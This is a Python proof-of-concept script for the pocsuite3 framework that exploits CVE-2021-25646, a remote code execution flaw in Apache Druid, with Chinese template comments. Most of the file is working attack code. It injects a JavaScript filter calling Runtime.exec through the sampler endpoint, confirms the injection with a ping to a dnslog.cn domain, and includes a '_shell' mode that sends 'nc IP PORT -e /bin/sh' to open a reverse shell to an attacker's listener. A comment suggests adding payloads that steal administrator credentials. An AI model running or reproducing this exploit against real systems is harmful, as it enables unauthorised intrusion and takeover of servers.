#!/usr/bin/env python
# -*- coding: utf-8 -*-


from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE
from pocsuite3.api import requests,VUL_TYPE, logger
import time

class ApacheDruidCVE202125646POC(POCBase):
    #PoC信息字段，需要完整填写全部下列信息
    vulID = '00002' #漏洞编号，若提交漏洞的同时提交PoC，则写成0
    version = '1' #PoC版本，默认为1
    author = 'Allan' #此PoC作者
    vulDate = '2021-01-21' #漏洞公开日期
    createDate = '2021-08-16' #编写PoC日期
    updateDate = '2021-08-16' #更新PoC日期，默认与createDate一样
    references = [
        'https://lists.apache.org/thread.html/\
            rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E'
        ] #漏洞地址来源，0day不写
    name = 'CVE-2021-25646 Apache Druid RCE' #PoC名称
    appPowerLink = 'http://druid.apache.org/' #漏洞产商主页
    appName = 'Apache Druid' #漏洞应用名称
    appVersion = 'Apache Druid < 0.20.1' #漏洞影响版本
    vulType = 'Apache Druid RCE' #漏洞类型
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    desc = '''
            Authenticated users can override system configurations in their requests which allows them to execute arbitrary code.
    ''' #在漏洞描述填写
    samples = [] #测试成功网址
    install_requires = [''] #PoC依赖的第三方模块，尽量不要使用第三方模块，必要时参考后面给出的参考链接
    pocDesc = '''PoC用法描述''' #在PoC用法描述填写

    #编写验证模式
    #通过dnslog回显
    def _verify(self):
        result = {}
        getdnssub_url = 'http://www.dnslog.cn/getdomain.php'
        getres_url = 'http://www.dnslog.cn/getrecords.php'
        dnsheaders = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64'}
        dnssess = requests.session()
        #获取dnslog的subdomain
        try:
            dnsreq = dnssess.get(url=getdnssub_url,headers=dnsheaders,allow_redirects=False,verify=False,timeout=10)
        except Exception as e:
            logger.warn(str(e))

        #执行ping dnslog的请求
        pocurl = self.url + '/druid/indexer/v1/sampler?for=filter'
        pocheaders = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64',
            'Content-Type': 'application/json;charset=UTF-8',
            'Content-Length': '1003',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9'
        }
        payload = 'ping catchyou.'+dnsreq.text
        pocjson = '{"type": "index", "spec": {"ioConfig": {"type": "index", "inputSource": {"type": "inline", "data": "{\\"isRobot\\":true,\\"channel\\":\\"#x\\",\\"timestamp\\":\\"2021-2-1T14:12:24.050Z\\",\\"flags\\":\\"x\\",\\"isUnpatrolled\\":false,\\"page\\":\\"1\\",\\"diffUrl\\":\\"https://xxx.com\\",\\"added\\":1,\\"comment\\":\\"Botskapande Indonesien omdirigering\\",\\"commentLength\\":35,\\"isNew\\":true,\\"isMinor\\":false,\\"delta\\":31,\\"isAnonymous\\":true,\\"user\\":\\"Lsjbot\\",\\"deltaBucket\\":0,\\"deleted\\":0,\\"namespace\\":\\"Main\\"}"}, "inputFormat": {"type": "json", "keepNullColumns": true}}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "timestamp", "format": "iso"}, "dimensionsSpec": {}, "transformSpec": {"transforms": [], "filter": {"type": "javascript", "dimension": "added", "function": "function(value) {java.lang.Runtime.getRuntime().exec(\'' + payload + '\')}", "": {"enabled": true}}}}, "type": "index", "tuningConfig": {"type": "index"}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}'
        try:
            r2 = requests.post(url=pocurl, headers=pocheaders, data=pocjson, verify=False) #执行ping指令
            time.sleep(5)
        except Exception as e:
            logger.warn(str(e))
        #检查dnslog日志
        try:
            dnsres = dnssess.get(url=getres_url,headers=dnsheaders,allow_redirects=False,verify=False,timeout=10)
            if dnsres.status_code == 200 and 'catchyou' in dnsres.text:
                result['VerifyInfo'] = {}
                # result['VerifyInfo']['URL'] = '{}:{}'.format(pr.hostname, pr.port)
                result['VerifyInfo']['URL'] = self.url
                result['extra'] = {}
                result['extra']['evidence'] = dnsres.text
        except Exception as e:
            logger.warn(str(e))
        return self.parse_attack(result)

    #编写攻击模式,此处直接给到验证模式，读者可以自行写出payload，获取管理员账号密码等信息。
    def _attack(self):
        return self._verify()

    def _shell(self):
        result = {}
        #执行反弹shell的请求
        pocurl = self.url + '/druid/indexer/v1/sampler?for=filter'
        pocheaders = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64',
            'Content-Type': 'application/json;charset=UTF-8',
            'Content-Length': '1003',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9'
        }
        IP = yourlistenIP
        PORT = yourlistenPORT
        payload = 'nc ' + IP + ' ' + PORT +' -e /bin/sh'
        pocjson = '{"type": "index", "spec": {"ioConfig": {"type": "index", "inputSource": {"type": "inline", "data": "{\\"isRobot\\":true,\\"channel\\":\\"#x\\",\\"timestamp\\":\\"2021-2-1T14:12:24.050Z\\",\\"flags\\":\\"x\\",\\"isUnpatrolled\\":false,\\"page\\":\\"1\\",\\"diffUrl\\":\\"https://xxx.com\\",\\"added\\":1,\\"comment\\":\\"Botskapande Indonesien omdirigering\\",\\"commentLength\\":35,\\"isNew\\":true,\\"isMinor\\":false,\\"delta\\":31,\\"isAnonymous\\":true,\\"user\\":\\"Lsjbot\\",\\"deltaBucket\\":0,\\"deleted\\":0,\\"namespace\\":\\"Main\\"}"}, "inputFormat": {"type": "json", "keepNullColumns": true}}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "timestamp", "format": "iso"}, "dimensionsSpec": {}, "transformSpec": {"transforms": [], "filter": {"type": "javascript", "dimension": "added", "function": "function(value) {java.lang.Runtime.getRuntime().exec(\'' + payload + '\')}", "": {"enabled": true}}}}, "type": "index", "tuningConfig": {"type": "index"}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}'
        try:
            r2 = requests.post(url=pocurl, headers=pocheaders, data=pocjson, verify=False) #执行ping指令
        except Exception as e:
            logger.warn(str(e))
        
        return self.parse_attack(result)

    #自定义输出函数，调用框架输出的实例Output
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("not vulnerability")
        return output

    #注册PoC类，这样框架才知道这是PoC类
register_poc(ApacheDruidCVE202125646POC)
